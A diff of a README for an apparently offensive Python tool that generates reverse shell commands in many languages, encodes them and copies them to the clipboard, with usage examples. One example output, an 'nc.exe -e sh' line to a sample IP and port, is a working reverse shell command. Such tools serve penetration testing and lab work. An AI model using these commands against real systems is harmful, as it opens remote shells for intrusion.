@@ -1,6 +1,8 @@
-# Reverse-shell-Generator
-Generates a reverse shell, allows URL encoding and copies the shell in your clipboard.  
-You can remove the .py and add the file to somewhere in your PATH so you can use it from anywhere whenever you need a revshell.
+## Requirements
+Pyperclip
+```bash
+  pip3 install pyperclip
+```
 ## Quick usage
 
 #### Clone the repository (or just copy-paste)
@@ -9,13 +11,35 @@ You can remove the .py and add the file to somewhere in your PATH so you can use
 ```
 #### Run the script
 ```bash
-    python3 reverse.py -sh < bash|netcat|php|ruby|perl|python > -lh <lhost> -lp* <lport> -enc*
+    python3 reverse.py -sh <revshell_type> -lh <lhost> -lp* <lport> -enc* <encode_type>
 ```  
-**Note:** default LPORT is 4444, params with * are optional.
+**Note:** default LPORT is 4444, params with * are optional.  
+**Available revshells:** bash, netcat, ncat, rustcat, perl, php, windows, powershell, python, ruby, socat, nodejs, telnet, zsh, lua, golang, awk.  
+**Available encodes**: base64(also accepts b64 as input), url  
+### Useful info  
+- Get a list of all available reverse shells  
+```bash
+    python3 reverse.py -s listall
+```  
+- Get a list of reverse shells of a given type with the name
+```bash
+    python3 reverse.py -s nc=list
+```
+Output:  
+ ![image](https://user-images.githubusercontent.com/101645735/178015002-a7ec7467-8b62-4c14-9648-e0c0bf90e019.png)
+
+- Choose a specific reverse shell by name
+```bash
+    python3 reverse.py -s nc=exe -lh 10.10.10.10
+```
+This would return => **nc.exe -e sh 10.10.10.10 4444**
 
 ## Test 
 - Created reverse shell:
 ```bashi
-  hack@hack:~$ python3 reverse.py -sh netcat -lh localhost
+  hack@hack:~$ python3 reverse.py -s bash=gurgui -lh localhost -lp 9001
 ```
-![alt text](https://media.giphy.com/media/r5pmuE8rE7ZTzvNXwu/giphy.gif)
+![If you see this text you are having trouble loading the gif :(](https://media.giphy.com/media/woqDTmU2pL2tc4eJ5c/giphy.gif)  
+
+As you might have noticed, I wrote bash=gurgui, that's because I changed the name of that exact bash rshell to gurgui in the script.  
+Having the script in ur path with custom names for shells you usually go for might make this super fast.  
